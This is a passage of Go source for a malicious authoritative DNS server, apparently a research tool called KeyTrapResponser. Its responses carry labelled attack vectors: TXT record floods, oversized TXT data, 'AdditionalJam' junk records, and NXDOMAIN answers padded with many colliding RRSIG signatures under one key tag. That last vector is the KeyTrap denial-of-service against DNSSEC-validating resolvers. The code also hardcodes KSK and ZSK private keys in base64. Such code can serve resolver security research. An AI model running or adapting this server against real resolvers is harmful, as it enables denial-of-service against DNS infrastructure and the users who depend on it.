				Type:  dns.DNSRRTypeNS,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATANS{NSDNAME: qName},
			}
			resp.Answer = append(resp.Answer, rr)
			rra := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(qName),
				Type:  dns.DNSRRTypeA,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: ServerIP},
			}
			resp.Additional = append(resp.Additional, rra)
		case dns.DNSRRTypeTXT:
			// Tricks攻击向量：TXTRRNum
			rrset := make([]dns.DNSResourceRecord, r.AttackVector.TXTRRNum)
			for i := 0; i < r.AttackVector.TXTRRNum; i++ {
				rRDATA := []byte{}
				for j := i; j > 0; j /= 256 {
					rRDATA = append(rRDATA, byte(j%256+1))
				}

				rdata := dns.DNSRDATATXT{
					TXT: string(rRDATA),
				}
				rr := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &rdata,
				}
				rrset[r.AttackVector.TXTRRNum-i-1] = rr
			}
			resp.Answer = append(resp.Answer, rrset...)
			// Tricks攻击向量：TXTRDataSize
			if r.AttackVector.TXTRDataSize > 0 {
				rdata := dns.DNSRDATATXT{
					TXT: r.AttackVector.RandomString,
				}
				rr := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &rdata,
				}
				resp.Answer = append(resp.Answer, rr)
			}
		case dns.DNSRRTypeSOA:
			soardata := dns.DNSRDATASOA{
				MName:   qName,
				RName:   "hostmaster." + qName,
				Serial:  uint32(InitTime),
				Refresh: 7200,
				Retry:   3600,
				Expire:  1209600,
				Minimum: 86400,
			}
			soa := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(qName),
				Type:  dns.DNSRRTypeSOA,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &soardata,
			}
			resp.Answer = append(resp.Answer, soa)
		}
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}

	// AdditionalJam攻击向量：AdditionalRRNum
	if qType == dns.DNSRRTypeA && (qLables[0] == "w" || qLables[0] == "www") && r.AttackVector.AdditionalRRNum > 0 {
		// 在Additional部分生成 子域名的TXT 记录
		txt := "AdditionalJam!"
		upperName := dns.GetUpperDomainName(&qName)
		for i := 0; i < r.AttackVector.AdditionalRRNum; i++ {
			txtRR := dns.DNSRDATATXT{
				TXT: txt,
			}
			rr := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(fmt.Sprintf("txt%d.", i) + upperName),
				Type:  dns.DNSRRTypeTXT,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &txtRR,
			}
			resp.Additional = append(resp.Additional, rr)
		}
	}

	// 为回复信息添加 DNSSEC 记录
	if IsDNSSEC {
		r.DNSSECManager.EnableDNSSEC(qry, &resp)
	}

	if r.AttackVector.IsNSEC && len(qLables) > 2 && qType == dns.DNSRRTypeA && (qLables[0] == "www" || qLables[0] == "w") {
		resp.Header.RCode = dns.DNSResponseCodeNXDomain
		upperName := dns.GetUpperDomainName(&qName)
		var rr dns.DNSResourceRecord

		//生成NSEC记录
		rdata := dns.DNSRDATANSEC{
			NextDomainName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
			TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
		}
		rr = dns.DNSResourceRecord{
			Name:  *dns.NewDNSName(upperName),
			Type:  dns.DNSRRTypeNSEC,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: 0,
			RData: &rdata,
		}
		resp.Authority = append(resp.Authority, rr)
		dMat := r.DNSSECManager.GetDNSSECMaterial(upperName)
		for i := 0; i < ExperiVec.CollidedSigNum-1; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				[]dns.DNSResourceRecord{rr},
				r.DNSSECManager.DNSSECConf.Algo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.ZSKTag),
				upperName,
			)
			resp.Authority = append(resp.Authority, wRRSIG)
		}
		sig := xperi.GenerateRRRRSIG(
			[]dns.DNSResourceRecord{rr},
			r.DNSSECManager.DNSSECConf.Algo,
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.ZSKTag),
			upperName,
			dMat.ZSKPriv,
		)
		resp.Authority = append(resp.Authority, sig)
		resp.Header.RCode = dns.DNSResponseCodeNXDomain
	}

	// 修正计数字段，返回回复信息
	xdns.FixCount(&resp)

	data := resp.Encode()

	// 是否启用名称压缩
	if IsNameCompression {
		crsp, err := dns.CompressDNSMessage(data)
		if err != nil {
			r.ResponserLogger.Printf("Error compressing response: %v", err)
			return data, nil
		} else {
			return crsp, nil
		}
	} else {
		return data, nil
	}
}

func getRandomString(size int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	charsetLen := len(charset)
	result := make([]byte, size)
	for i := range result {
		result[i] = charset[rand.Intn(charsetLen)]
	}
	return string(result)
}

func main() {
	// 生成 KSK 和 ZSK
	// 使用ParseKeyBase64解析预先生成的公钥，
	// 该公钥应确保能够被解析器通过 信任锚（Trust Anchor）建立的 信任链（Chain of Trust） 所验证。
	kskPublic := xperi.ParseKeyBase64("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY")
	kskPriv := xperi.ParseKeyBase64("ppaXHmb7u1jOxEzrLzuGKzbjmSLIK4gEhQOvws+cpBQyJbCwIM1Nrk4j5k94CP9e")

	material := InitMaterial("test", dns.DNSSECAlgorithmECDSAP384SHA384, kskPublic, kskPriv)

	dMap := sync.Map{}
	dMap.Store("test", material)

	ExperiVec.RandomString = getRandomString(ExperiVec.TXTRDataSize)

	server := xdns.NewXdnsServer(conf,
		&KeyTrapResponser{
			ResponserLogger: log.New(conf.LogWriter, "KeyTrapResponser: ", log.LstdFlags),
			DNSSECManager: KeyTrapManager{
				DNSSECConf: xdns.DNSSECConfig{
					Algo: dns.DNSSECAlgorithmECDSAP384SHA384,
					Type: dns.DNSSECDigestTypeSHA384,
				},
				DNSSECMap: dMap,
				AttackVec: ExperiVec,
			},
			AttackVector: ExperiVec,
		},
	)

	server.Start()
}

// InitTrustAnchor 根据 DNSSEC 配置生成指定区域的信任锚点
// 其接受参数为：
//   - zName string，区域名
//   - dConf DNSSECConfig，DNSSEC 配置
//   - kBytes []byte，KSK 公钥
//   - pkBytes []byte，KSK 私钥
//
// 返回值为：
//   - map[string]DNSSECMaterial，生成的信任锚点
func InitMaterial(name string, algo dns.DNSSECAlgorithm, kskPublic, kskPriv []byte) DNSSECMaterial {

	// // 为了对Referral思路进行测试，暂使用固定ZSK
	// zskRR, zskPriv := xperi.GenerateRRDNSKEY(name, algo, dns.DNSKEYFlagZoneKey)
	zskPub, err := base64.StdEncoding.DecodeString("zNViYVKReDHMoe31Nj6S1nFgMg043Lk+6Gg4bESSw7QQPvcwxQp2yWVvtskCd9ysub0D4uMJY0g2QbW6AC+PhdUR8IPxRQASOBAl+8noHaOoq1nkaAnBcGCr/Gmpfz/D")
	if err != nil {
		panic(err)
	}
	zskPriv, err := base64.StdEncoding.DecodeString("LbMJgyAcZiBWokf/gO9hzOztqG7Z/gvoebCb/S54a68+8nqnWmBRdfGnhfnWwuLX")
	if err != nil {
		panic(err)
	}

	zskRR := dns.DNSResourceRecord{
		Name:  *dns.NewDNSName(name),
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: 0,
		RData: &dns.DNSRDATADNSKEY{
			Flags:     dns.DNSKEYFlagZoneKey,
			Protocol:  dns.DNSKEYProtocolValue,
			Algorithm: algo,
			PublicKey: zskPub,
		},
	}

	zskRDATA := zskRR.RData.(*dns.DNSRDATADNSKEY)

	kskRDATA := dns.DNSRDATADNSKEY{
		Flags:     dns.DNSKEYFlagSecureEntryPoint,
		Protocol:  dns.DNSKEYProtocolValue,
		Algorithm: algo,
		PublicKey: kskPublic,
	}

	kskRR := dns.DNSResourceRecord{
		Name:  *dns.NewDNSName(name),
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(kskRDATA.Size()),
		RData: &kskRDATA,
	}

	zskTag := xperi.CalculateKeyTag(*zskRDATA)
	kskTag := xperi.CalculateKeyTag(kskRDATA)

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRR,
		KSKRecord: kskRR,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,
	}
}
